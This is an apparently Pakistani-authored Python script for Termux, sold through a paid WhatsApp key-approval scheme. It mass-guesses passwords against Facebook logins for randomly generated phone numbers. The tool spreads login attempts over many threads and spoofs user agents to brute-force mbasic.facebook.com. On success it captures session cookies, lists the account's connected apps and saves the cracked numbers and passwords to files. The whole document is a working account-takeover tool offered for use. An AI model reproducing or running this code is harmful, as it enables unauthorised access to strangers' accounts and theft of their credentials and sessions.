
import os
import sys
import time
import requests
import uuid
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
	
	
	

def main_apv():
    imt="xcx4Y=="
    ak="XDCRLRS"
    os.system('clear')
    print(logo1)
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("༄POWER᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇")
        print ("༄POWER᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ("༄POWER᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("༄POWER•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
        os.system('am start https://wa.me/+923151112743?text=' + tks)
    r1=requests.get("https://raw.githubusercontent.com/Ykimg/PAID/main/Approval.txt").text
    if key1 in r1:
        o()
    else:
        os.system("clear")
        print(logo1)
        print (" •───────────────────────────────────────•")
        print (" \033[1;97mGIVE ME 100RS FOR APROVAL ")     
        print (" \033[1;37mYOUR KEY : "+ak+key1)     
        print (" Key And Sent Me WP Approvel Your Key ")
        print (" •───────────────────────────────────────•")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
        os.system('am start https://wa.me/+923151112743?text=' + tks)
 



logo1 = ("""\x1b[1;37m

.%%...%%...%%%%...%%%%%...%%...%%...%%%%...%%..%%.
.%%%.%%%..%%..%%..%%..%%..%%...%%..%%..%%..%%%.%%.
.%%.%.%%..%%%%%%..%%%%%...%%.%.%%..%%%%%%..%%.%%%.
.%%...%%..%%..%%..%%..%%..%%%%%%%..%%..%%..%%..%%.
.%%...%%..%%..%%..%%..%%...%%.%%...%%..%%..%%..%%.
 ════════════════════════════════════════════════
 AUTHOR : MARWAN                            
 GITHUB : MARWAN                                        
 YOU TUBE : MARWAN                                      
 TOOLS NAME : RANDOM
 TOOLS : PAID                                                                
 ════════════════════════════════════════════════
 \t\tNeed Get Approved First
 ════════════════════════════════════════════════""")


def o():
    os.system('clear')
    print(logo)
    print(" [1] RANDOM AUTO PASSWORD ")
    print(" [2] RANDOM CHOICE PASSWORD ")
    print(40*"=")
    opt = input(' [+]\x1b[1;37m CHOOSE --> ')
    if opt == '1':
        i()
    if opt == '2':
        x()
    if opt == '0':
        os.system('exit')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

            
            

            
RED = '\033[1;37m'
WHITE = '\033[1;37m'
GREEN = '\033[1;37m' 
YELLOW = '\033[1;37m'
BLUE = '\033[1;37m'
ORANGE = '\033[1;37m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()



logo = ("""\x1b[1;37m

.%%...%%...%%%%...%%%%%...%%...%%...%%%%...%%..%%.
.%%%.%%%..%%..%%..%%..%%..%%...%%..%%..%%..%%%.%%.
.%%.%.%%..%%%%%%..%%%%%...%%.%.%%..%%%%%%..%%.%%%.
.%%...%%..%%..%%..%%..%%..%%%%%%%..%%..%%..%%..%%.
.%%...%%..%%..%%..%%..%%...%%.%%...%%..%%..%%..%%.
 ════════════════════════════════════════════════
 AUTHOR : MARWAN                            
 GITHUB : MARWAN                                        
 YOU TUBE : MARWAN                                      
 TOOLS NAME : RANDOM
 ════════════════════════════════════════════════""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;37mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;37mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1) 
 
#User agents
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s %s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'    [x] %s  Your Active Apps      :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"    [%s%s] %s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'  %s Your Expired Apps :'%(M))
        for i in range(len(game)):
            print(f"    [%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
        	print()
    
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

    
# APK CHECK








def i():
                user=[]
                os.system('clear')
                print (logo)
                print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
                print('[√] EXAMPLE: 0306,0315,0335,0345 ETC')
                print(40*"=")
                code = input('\033[1;37m[?] How many numbers do you want to add : ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m[?] How many numbers do you want to add : '))
                        print(40*"=")
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with ThreadPool(max_workers=30) as manshera:     
                        os.system('clear')
                        print (logo)
                        tl = str(len(user))
                        print(' TOTAL ID :\033[1;92m '+tl)
                        print (' \033[1;97mSIM CODE: \033[1;92m'+code)
                        print('\033[1;37m THE PROCESS HAS BEEN STARTED')
                        print('\033[1;37m USE AEROPLANE MOOD IN EVERY 5 MIN ')
                        print(40*"=")
                        for psx in user:
                                uid = code+psx
                                pwx = [psx,uid,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                manshera.submit(rcrack,uid,pwx,tl)





def x():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
    print('[√] EXAMPLE: 0306,0315,0335,0345 ETC')
    code = input(' PUT CODE : ')
    limit = int(input(' EXAMPLE: 1000, 5000, 10000\n[+]How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(' TOTAL ID :\033[1;92m '+tl)
        print (' \033[1;97mSIM CODE: \033[1;92m'+code)
        print('\033[1;37m THE PROCESS HAS BEEN STARTED')
        print('\033[1;37m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(40*"=")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path':'/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\033[1;32m(MARWAN-OK) ' +uid+ ' | ' +ps+    '  \n \033[1;34mCookie = \033[1;34m'+coki+  ' \n '+pro+'  \033[0;94m')
                cek_apk(session,coki)
                open('/sdcard/MARWAN-0X-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('\33[1;31m(MARWAN-CP) ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MARWAN-0X-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('%s[MARWAN] [%s/%s]  [OK:- %s ] [CP:- %s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
main_apv()
 
